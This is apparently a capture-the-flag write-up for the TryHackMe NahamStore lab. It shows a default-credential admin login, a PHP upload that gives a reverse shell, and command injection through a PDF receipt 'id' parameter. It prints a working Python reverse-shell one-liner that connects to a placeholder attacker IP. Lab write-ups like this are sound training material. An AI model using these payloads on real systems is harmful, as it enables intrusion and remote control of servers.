+ Access `http://nahamstore.thm:8000/admin`:

![](<Images/Pasted image 20250109174212.png>)

--> We can guess the credentials `admin:admin` and try to login.

+ When we access successfully, we've found the feature **"Edit Campaign"**:

![](<Images/Pasted image 20250109174452.png>)

+ We can upload the payload PHP to generate the Reverse Shell:

![](<Images/Pasted image 20250109184157.png>)

+ After update, we access "Campaign" with parameter `cmd`:

![](<Images/Pasted image 20250109184529.png>)

------------------------------------------------------------------

+ When access `/account/order/{number_order}`, we can use the feature **"PDF Receipt"** to generate the scan receipt. Using BurpSuite to capture the request:

![](<Images/Pasted image 20250116170028.png>)

--> We can inject the payload into parameter **"id"** to generate the reverse shell. Capture the reverse shell to access initial sever.

+ We will use payload Python:
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<IP-attack",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

+ In this case, we encode the payload and combine `$()` to execute the command.
+ **Note**: `$(command)` is “command substitution”.  As you seem to understand, it runs the _`command`_, captures its output, and inserts that into the command line that contains the `$()`.

![](<Images/Pasted image 20250116170821.png>)
------------------------------------------------------------------
